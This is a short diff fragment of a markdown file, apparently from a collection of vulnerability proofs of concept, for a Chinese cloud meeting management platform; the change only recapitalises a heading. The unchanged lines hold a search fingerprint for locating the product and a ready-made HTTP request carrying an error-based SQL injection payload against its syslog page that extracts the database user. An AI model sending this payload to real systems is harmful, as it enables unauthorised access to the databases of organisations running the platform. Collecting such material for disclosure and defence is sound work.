@@ -8,7 +8,7 @@
 title="华望云会议管理平台"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /page/syslog.inc?search=1%25'+and+1%3d(updatexml(0x7e,concat(1,(select+user())),1))+and+'%25%25'+like+'&params[]=displayName&params[]=module&params[]=act&params[]=ip&selectTime=1 HTTP/1.1
